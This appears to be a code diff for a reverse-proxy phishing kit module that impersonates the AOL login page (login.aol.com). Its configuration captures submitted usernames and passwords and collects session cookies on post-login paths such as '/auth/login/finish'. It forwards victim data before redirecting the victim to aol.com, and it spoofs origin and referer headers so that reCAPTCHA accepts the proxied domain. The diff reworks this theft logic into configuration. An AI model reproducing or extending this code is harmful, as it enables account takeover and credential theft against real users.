@@ -99,12 +99,6 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
 
-        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
-
-               
-        this.req.headers['origin'] = `https://${clientContext.currentDomain}`
-        this.req.headers['referer'] = `https://${clientContext.currentDomain}`
-
 
         if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
             const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
@@ -128,33 +122,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         if (this.req.url.startsWith('/recaptcha/enterprise')) {
             this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
             this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''
-
-
-            console.log(JSON.stringify(this.req.headers))
             
             return super.superExecuteProxy('www.google.com', clientContext)
 
         }
 
-       
-
-        if (this.req.url.startsWith('/recaptcha/releases')) {
-            return super.superExecuteProxy('www.gstatic.com', clientContext)
-
-        }
-
-        if (this.req.method === 'POST') {
-            super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            clientContext.setLogAvailable(true);
-            // super.captureBody(clientContext.currentDomain, clientContext)
-
-        }
-        if (this.req.url === '/auth/login/finish' || this.req.url === '/account/fb-messenger-linking' 
-        || this.req.url.startsWith('/account/upsell/webauth') || this.req.url.startsWith('/account/comm-channel/')) {
-            super.sendClientData(clientContext, {})
-            return super.exitLink('https://aol.com')
-        }
-
+        
 
         const redirectToken = this.checkForRedirect()
         if (redirectToken !== null) {
@@ -199,41 +172,65 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
 const configExport = {
+    SCHEME: 'aol',
+
     CURRENT_DOMAIN: 'login.aol.com',
 
     START_PATH: '/',
 
     AUTOGRAB_CODE: 'username',
 
-    PRE_HANDLERS:
-        [
-        ],
+    COOKIE_PATH: ['/auth/login/finish', '/account/fb-messenger-linking', '/account/upsell/webauth', 
+    '/account/comm-channel/'],
+
+    EXIT_TRIGGER_PATH: ['/auth/login/finish', '/account/fb-messenger-linking', '/account/upsell/webauth', 
+    '/account/comm-channel/'],
+
+
+    EXIT_URL: 'https://aol.com',
+
+    EXTRA_COMMANDS: [
+        
+        {
+            path: '/recaptcha/releases.*',
+            command: 'CHANGE_DOMAIN',
+            command_args: {
+                new_domain: 'www.gstatic.com',
+                persistent: false,
+                },
+        },
+
+    ],
+
+
+    PRE_HANDLERS:[],
+
     PROXY_REQUEST: ProxyRequest,
     PROXY_RESPONSE: ProxyResponse,
     DEFAULT_PRE_HANDLER: DefaultPreHandler,
 
     CAPTURES: {
-        loginUserName: {
+        aolUserName: {
             method: 'POST',
             params: ['username'],
             urls: '',
             hosts: ['login.aol.com'],
         },
 
-        loginPassword: {
+        aolPassword: {
             method: 'POST',
             params: ['password'],
             urls: '',
             hosts: ['login.aol.com'],
         },
+    },
 
+    //MODULE OPTIONS 
+    MODULE_ENABLED: true,
 
-        defaultPhpCapture: {
-            method: 'POST',
-            params: ['default'],
-            urls: ['/web'],
-            hosts: 'PHP-EXEC',
-        },
+    MODULE_OPTIONS: {
+        startPath: this.START_PATH,
+        exitLink: '',
     },
 
     // proxyDomain: process.env.PROXY_DOMAIN,
